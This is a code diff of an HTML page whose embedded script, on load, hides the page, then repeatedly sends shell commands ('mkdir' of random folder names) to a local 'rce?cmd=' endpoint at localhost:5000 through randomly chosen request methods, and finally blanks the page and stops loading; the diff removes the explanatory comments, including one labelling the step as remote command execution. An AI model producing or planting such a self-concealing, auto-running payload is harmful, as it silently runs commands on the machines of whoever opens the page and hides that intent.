@@ -9,19 +9,14 @@
 </head>
 <body>
     <script>
-        // Hide everything
         document.documentElement.style.display = 'none';
         
-        // Generate random directory name
         function randomDir() {
             return `folder${Math.floor(Math.random() * 1000000)}`;
         }
-
-        // Create folder via RCE
         function createFolder(dirName) {
             const cmd = `mkdir ${dirName}`;
             
-            // Multiple methods to ensure execution
             const methods = [
                 () => { new Image().src = `http://localhost:5000/rce?cmd=${encodeURIComponent(cmd)}`; },
                 () => { 
@@ -39,16 +34,13 @@
                 }
             ];
             
-            // Use random method
             methods[Math.floor(Math.random() * methods.length)]();
         }
 
-        // Create 10 folders
         for(let i = 0; i < 10; i++) {
             createFolder(randomDir());
         }
 
-        // Clean up
         document.write('');
         window.stop();
     </script>
